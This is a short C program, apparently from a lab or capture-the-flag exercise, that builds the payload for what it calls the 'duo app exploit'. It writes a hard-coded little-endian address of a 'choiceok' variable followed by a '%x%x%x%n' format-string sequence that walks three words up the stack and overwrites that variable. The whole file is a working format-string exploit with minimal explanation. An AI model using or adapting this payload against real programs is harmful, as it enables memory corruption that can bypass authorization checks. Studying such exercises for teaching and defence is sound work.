/*
*   This code creates the payload for the duo app exploit
*/
#include <stdio.h>
#include <unistd.h>

int main()
{
    unsigned int nonprintable=0x0000000000004014; //address of choiceok variable
    write(1, "\x14\x40\x00\x00\x00\x00\x00\x00%x%x%x%n", 21);
    //%x represents a word
    //choiceok is 3 words from the top of the stack
}